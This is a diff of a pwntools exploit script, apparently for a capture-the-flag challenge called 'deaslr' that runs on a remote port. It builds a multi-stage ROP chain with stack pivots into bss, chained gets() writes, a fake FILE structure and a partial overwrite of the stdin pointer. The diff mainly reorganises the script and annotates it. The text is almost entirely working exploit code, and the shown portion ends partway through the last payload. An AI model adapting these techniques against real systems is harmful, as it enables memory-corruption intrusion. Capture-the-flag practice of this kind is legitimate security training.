@@ -27,9 +27,9 @@ leak_dec = lambda r, offset=0: int(r, 10) - offset
 A = lambda len=1, c=b'A': c * len
 z = lambda len=1, c=b'\0': c * len
 
-exe = ELF("deaslr_patched")
-libc = ELF("./libc.so.6")
-ld = ELF("./ld-2.23.so")
+exe = ELF("deaslr_patched", checksec=False)
+libc = ELF("./libc.so.6", checksec=False)
+ld = ELF("./ld-2.23.so", checksec=False)
 
 context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe", "-w", "0", "split-pane", "-V", "-s", "0.5", "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
 context.binary = exe
@@ -58,6 +58,18 @@ def conn():
         port = 10402
         return remote(host, port)
 
+pop_rbx_rbp_r12_r13_r14_r15_ret = 0x4005ba
+pop_rdi_ret = 0x4005c3
+pop_rsi_r15_ret = 0x4005c1
+nop_ret = 0x4005c8
+leave_ret = 0x400554
+call = 0x4005a0
+
+stack_1 = 0x601400
+stack_2 = stack_1 + 0x400
+fake_file = stack_2 + 0x58
+stdin_addr = stack_1 - 0x60
+
 attempt = 0
 while True:
     attempt += 1
@@ -65,83 +77,88 @@ while True:
 
     p = conn()
 
-    pop_rbx_rbp_r12_r13_r14_r15_ret = 0x4005ba
-    pop_rdi_ret = 0x4005c3
-    pop_rsi_r15_ret = 0x4005c1
-    nop_ret = 0x4005c8
-    leave_ret = 0x400554
-    call_writefile = 0x4005a0
-
-    stack_1 = 0x601400
-    stack_2 = stack_1 + 0x400
-    fake_file = stack_2 + 0x58
-    stdin_addr = stack_1 - 0x60
-
-    print("pivot to stack 1")
+    print("1st write -> ROP at main() return")
+    # First ROP
     pl = flat(
         A(0x10),
-        stack_1,
+        stack_1, # saved rbp
+
         pop_rdi_ret,
         stack_1,
-        exe.symbols['gets'], # write to stack 1
-        leave_ret
+        exe.symbols['gets'], # 2nd write
+        
+        leave_ret # rsp -> stack 1, rbp -> stack 2
     )
     sl(p, pl)
 
     sleep(0.1)
 
-    print("pivot to stack 2, write stdin to bss")
+    print("2nd write -> ROP at stack 1")
+    # ROP at stack 1
     pl = flat(
-        stack_2,
-        exe.symbols['main'], # write stdin
-        leave_ret,
+        stack_2, # saved rbp
+        exe.symbols['main'], # 3rd write
+        leave_ret, # rsp -> stack 2, rbp...
     )
 
+    # Padding
     pl += p64(0) * ((stack_2 - stack_1 - 0x18)//8)
 
+    # ROP at stack 2
     pl += flat(
-        stdin_addr - 0x20,
+        stdin_addr - 0x20, # saved rbp
+
         pop_rdi_ret,
         stdin_addr + 0x8,
-        exe.symbols['gets'],
+        exe.symbols['gets'], # 4th write
+
         pop_rdi_ret,
         stdin_addr - 0x18,
-        exe.symbols['gets'],
-        pop_rdi_ret,
+        exe.symbols['gets'],  # 5th write
 
-        stack_1, # aftermath
-        exe.symbols['gets'],
+        pop_rdi_ret,
+        stack_1,
+        exe.symbols['gets'], # 6th write
+
         leave_ret
     )
 
+    # Fake FILE structure
+    # __fileno = 1, __flags2 = 2
     pl += flat(z(0x70), 1, 2)
 
     sl(p, pl)
 
     sleep(0.1)
 
-    print("write stdin")
+    print("3rd write -> STDIN address at stack 1 - 0x60")
     sl(p, b'A')
 
-    print("under")
+    '''
+    4005a0:	4c 89 ea             	mov    rdx,r13
+    4005a3:	4c 89 f6             	mov    rsi,r14
+    4005a6:	44 89 ff             	mov    edi,r15d
+    4005a9:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
+    '''
+    print("4th write -> ROP under STDIN address")
     pl = flat(
-        100,
-        exe.got['gets'],
-        fake_file,
-        call_writefile
+        100, # r13 -> rdx
+        exe.got['gets'], # r14 -> rsi
+        fake_file, # r15 -> rdi
+        call
     )
     sl(p, pl)
 
-    print("above")
+    print("5th write -> ROP above STDIN address")
     pl = flat(
         pop_rbx_rbp_r12_r13_r14_r15_ret,
-        0x4eb,
-        0x4ec,
-        b'\0'
+        0x4eb, # rbx
+        0x4ec, # rbp = rbx + 1
+        b'\0', # Overwrite last byte
     )
     sl(p, pl)
 
-    print("aftermath")
+    print("6th write -> ")
     pl = flat(
         pop_rdi_ret,
         stack_1 + 0x18,
